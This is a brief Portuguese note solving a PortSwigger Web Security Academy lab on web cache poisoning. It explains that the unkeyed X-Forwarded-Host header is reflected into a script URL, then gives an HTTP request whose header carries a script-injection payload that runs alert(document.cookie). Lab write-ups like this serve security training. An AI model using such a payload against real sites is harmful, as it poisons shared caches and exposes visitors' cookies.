#ctf

https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header

Usando a extensão Param Miner do Burp, ele acha uma unkeyed (X-Forwarded-Host) em "/" e o valor desse parâmetro é usado como link para acessar um js, substituindo a url por um payload malicioso:

```
GET / HTTP/2
Host: 0abf00ac036a464180383f10002700db.web-security-academy.net
X-Forwarded-Host: "></script><script type="text/javascript">alert(document.cookie)</script>
```

GG